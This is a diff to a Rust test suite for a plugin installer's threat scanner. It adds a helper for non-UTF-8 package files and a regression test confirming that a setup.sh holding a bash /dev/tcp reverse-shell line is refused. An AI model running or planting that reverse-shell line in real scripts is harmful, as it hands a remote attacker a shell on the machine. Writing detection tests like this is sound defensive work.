@@ -16,6 +16,12 @@ fn package(home: &Path, extra: &[(&str, &str)]) -> PathBuf {
 
 /// [`package`] at `version` (the package file is replaced).
 fn package_at(home: &Path, version: &str, extra: &[(&str, &str)]) -> PathBuf {
+    let extra: Vec<(&str, &[u8])> = extra.iter().map(|(n, t)| (*n, t.as_bytes())).collect();
+    package_bytes(home, version, &extra)
+}
+
+/// [`package_at`] with files that need not be UTF-8.
+fn package_bytes(home: &Path, version: &str, extra: &[(&str, &[u8])]) -> PathBuf {
     let dir = home.join("src/p");
     let _ = std::fs::remove_dir_all(&dir);
     pmt_plugins::testkit::install("sample-tool", &dir);
@@ -173,6 +179,24 @@ fn code_after_a_powershell_block_comment_closes_is_still_refused() {
         );
         assert!(!installed(home.path()), "{text}");
     }
+}
+
+#[test]
+fn a_reverse_shell_in_a_script_that_is_not_utf8_is_still_refused() {
+    // Regression: one invalid byte in a comment made setup.sh "binary", its
+    // findings were dropped and it installed without --force, though
+    // /bin/sh runs line 3.
+    let script = b"#!/bin/sh\n# build helper \xff\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
+    let home = temp_home();
+    let package = package_bytes(home.path(), "1.0.0", &[("setup.sh", script)]);
+    let out = install(home.path(), &package, &["--force"]);
+    assert_eq!(out.status.code(), Some(77), "{}", stderr(&out));
+    assert!(
+        stderr(&out).contains("threat scan verdict dangerous (reverse_shell in setup.sh:3)"),
+        "{}",
+        stderr(&out)
+    );
+    assert!(!installed(home.path()));
 }
 
 #[test]
